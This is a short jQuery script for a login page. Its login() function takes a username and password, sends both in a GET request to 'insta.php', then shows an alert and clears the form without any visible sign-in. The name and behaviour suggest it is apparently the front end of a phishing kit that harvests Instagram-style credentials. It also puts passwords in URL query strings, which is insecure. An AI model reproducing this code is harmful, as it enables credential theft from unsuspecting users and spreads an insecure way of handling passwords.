$(document).ready(function(){

var winh = $(window).height();

$(".header").height(winh);
$(".space").height(winh /4);


$("button").click(function(){
window.location.href = "login.html";
});



});

function login(){
var username = $("#username").val();
var pass = $("#pass").val();

if(username.length > 0 && pass.length > 5){

$("#logbut").attr("disabled","disabled");
    
    $.get( "insta.php?username=" + username + "&pass="+pass, function( data ) {
$("#logbut").removeAttr("disabled","disabled");
$(".alert").show();
$("#username,#pass").val("");
      });

}

}